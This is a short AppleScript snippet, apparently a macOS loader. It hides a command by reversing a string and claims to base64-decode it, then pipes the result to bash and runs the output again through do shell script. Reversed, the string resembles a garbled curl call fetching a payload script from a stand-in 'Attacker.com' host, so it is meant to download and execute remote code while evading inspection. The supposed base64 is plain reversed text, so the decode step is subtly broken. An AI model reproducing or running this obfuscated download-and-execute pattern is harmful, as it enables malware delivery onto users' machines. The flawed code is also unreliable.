-- Reverse the base64 of payload and decode at runtime
set rev_b64 to "ohc==hs.cdaolyap/moc.rekcattA//:ptth s- lruY"
set cmd to (do shell script "echo " & quoted form of rev_b64 & " | rev | base64 -D | bash")
do shell script cmd
